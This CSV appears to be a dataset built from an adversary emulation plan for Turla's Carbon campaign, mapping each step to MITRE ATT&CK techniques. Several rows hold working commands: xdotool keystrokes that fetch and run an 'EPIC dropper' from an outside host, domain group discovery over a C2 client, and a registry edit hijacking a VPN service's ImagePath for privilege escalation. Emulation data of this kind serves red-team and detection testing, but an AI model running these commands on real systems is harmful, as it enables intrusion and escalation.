org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
turla_carbon,turla_carbon,unknown,turla_carbon::1,1,Download EPIC dropper (User),"id: 2c7ad0e1-d112-4c71-8deb-38bc3ce5654b | name: Download EPIC dropper (User) | description: Using xdotool, send keystrokes to download the EPIC dropper. 
 | tactic: Initial Access | technique: attack_id: T1566.002 | name: Phishing: Spearphishing Link | procedure_group: procedure_initial_access | procedure_step: 1.A.1 | platforms: linux: sh: command: rdp_pid=$(pgrep -f xfreerdp);
rdp_window=$(xdotool search --pid ""$rdp_pid"");
xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
xdotool key --window ""$rdp_window"" Ctrl+Escape;
sleep 6;
xdotool type --window ""$rdp_window"" ""run"";
sleep 6;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool type --window ""$rdp_window"" ""microsoft-edge"";
xdotool key --window ""$rdp_window"" shift+colon; 
xdotool type --window ""$rdp_window"" ""http"";
xdotool key --window ""$rdp_window"" shift+colon; 
xdotool type --window ""$rdp_window"" ""//anto-int.com/"";
xdotool key --window ""$rdp_window"" shift+N; 
xdotool key --window ""$rdp_window"" shift+T; 
xdotool key --window ""$rdp_window"" shift+F; 
xdotool key --window ""$rdp_window"" shift+V; 
xdotool type --window ""$rdp_window"" ""ersion.exe"";
xdotool key --window ""$rdp_window"" Return;
sleep 20;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;

xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;

xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;

xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;

xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Return;
 | timeout: 120","[""T1566.002""]","[""T1566""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::2,2,Phishing: Spearphishing Link,attack_id: T1566.002 | name: Phishing: Spearphishing Link,"[""T1566.002""]","[""T1566""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::3,3,Run EPIC dropper (User),"id: bb4dd7c0-c5df-4321-94ca-cb7da59b9c32 | name: Run EPIC dropper (User) | description: Using xdotool, run the EPIC droppper. 
 | tactic: Execution | technique: attack_id: T1204.002 | name: User Execution: Malicious File | procedure_group: procedure_execution | procedure_step: 1.A.2 | platforms: linux: sh: command: rdp_pid=$(pgrep -f xfreerdp);
rdp_window=$(xdotool search --pid ""$rdp_pid"");
xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
xdotool key --window ""$rdp_window"" Ctrl+Escape;
sleep 6;
xdotool type --window ""$rdp_window"" ""run"";
sleep 6;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool type --window ""$rdp_window"" 'C';
xdotool key --window ""$rdp_window"" shift+colon;           
xdotool type --window ""$rdp_window"" '\Users\#{first.target.user}\Downloads\';
xdotool key --window ""$rdp_window"" shift+N; 
xdotool key --window ""$rdp_window"" shift+T; 
xdotool key --window ""$rdp_window"" shift+F; 
xdotool key --window ""$rdp_window"" shift+V; 
xdotool type --window ""$rdp_window"" ""ersion"";
sleep 6;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool key --window ""$rdp_window"" R;
sleep 30; 
 | timeout: 180","[""T1204.002""]","[""T1204""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::4,4,User Execution: Malicious File,attack_id: T1204.002 | name: User Execution: Malicious File,"[""T1204.002""]","[""T1204""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::5,5,Execute net group discovery commands and execute `tasklist /svc` (Adversary),"id: eb66d327-3f82-4433-8897-76cd8a46865b | name: Execute net group discovery commands and execute `tasklist /svc` (Adversary) | description: Execute net group discovery commands and execute `tasklist /svc` 
 | tactic: Discovery | technique: attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 3.A.1-2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | net group ""Domain Admins"" /domain && net group ""Domain Computers"" /domain && net group ""Domain Controllers"" /domain && tasklist /svc' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.epic.id","[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::6,6,Permission Groups Discovery: Domain Groups,attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::7,7,Reg query the ViperVPNSvc Service & verify which users can access it (Adversary),"id: 88bb16c5-f78b-45c3-91b6-a7422cd2fb13 | name: Reg query the ViperVPNSvc Service & verify which users can access it (Adversary) | description: Reg query the ViperVPNSvc Service & verify which users can access it 
 | tactic: Execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: Powershell | procedure_group: procedure_execution | procedure_step: 3.A.5-6 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell ""$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access""' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.epic.id","[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::8,8,Command and Scripting Interpreter: Powershell,attack_id: T1059.001 | name: Command and Scripting Interpreter: Powershell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::9,9,Modify the ViperVPN service registry key (Adversary),"id: d5e29782-72ca-45f0-b286-09525ae91d75 | name: Modify the ViperVPN service registry key (Adversary) | description: Modify the ViperVPN service registry key
 | tactic: Privilege Escalation | technique: attack_id: T1574.011 | name: Hijack Execution Flow: Services Registry Permissions Weakness | procedure_group: procedure_privilege_escalation | procedure_step: 3.A.7 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg add ""HKLM\system\currentcontrolset\services\ViperVPNSvc"" /t REG_EXPAND_SZ /v ImagePath /d ""cmd.exe /c %TEMP%\mxs_installer.exe"" /f' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.epic.id","[""T1574.011""]","[""T1574""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::10,10,Hijack Execution Flow: Services Registry Permissions Weakness,attack_id: T1574.011 | name: Hijack Execution Flow: Services Registry Permissions Weakness,"[""T1574.011""]","[""T1574""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
